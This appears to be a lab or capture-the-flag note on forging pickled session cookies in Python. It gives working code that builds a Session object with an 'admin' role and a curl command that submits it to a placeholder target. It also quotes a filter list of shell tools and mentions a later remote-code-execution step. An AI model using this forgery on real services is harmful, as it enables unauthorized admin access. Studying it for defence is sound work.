# Python Pickle Object Injection

## Overview

Python's `pickle` serializes objects including their module path. When a cookie or token contains a pickled object, you can forge it with a modified class to manipulate server-side state (e.g. elevate role to admin).

## Identifying the Vulnerability

- Cookie value decodes to bytes starting with `80 04 95` → Pickle protocol 4
- Source shows `pickle.loads(base64.b64decode(cookie))` on user-controlled input
- `Session` class has `self.role` field checked by `isAdmin()` → `return self.role == 'admin'`

## Forging the Cookie

**Critical:** The pickled class must use the exact same module path as the server. Pickle stores the class as `module.ClassName`. If you serialize from `__main__`, the server can't find it and returns 500.

**Fix:** Mirror the server's directory structure locally.

```
exploit/
├── run.py
└── util/
    ├── __init__.py
    └── auth.py        ← class Session here, module = util.auth
```

`exploit/util/auth.py`:
```python
import pickle, base64

class Session:
    def __init__(self, username, role):
        self.username = username
        self.role = role

def sessionToCookie(session):
    return base64.b64encode(pickle.dumps(session))
```

`exploit/run.py`:
```python
import util.auth
s = util.auth.Session("attacker", "admin")
print(util.auth.sessionToCookie(s).decode())
```

Run from `exploit/` directory:
```bash
cd exploit && python3 run.py
```

## Submitting

```bash
curl -s http://TARGET:5000/admin \
  -H "Cookie: auth_8bH3mjF6n9=<forged_cookie>"
```

## Key Notes

- Module path matters: pickle encodes `util.auth.Session`, not `__main__.Session` — directory structure must match
- Functions inside the class don't matter for serialization; only instance variables (`self.*`) are pickled
- Badword filter (`nc`, `ncat`, `/bash`, `/sh`, `subprocess`, `Popen`) applies here — irrelevant for role escalation but important for RCE (next section)
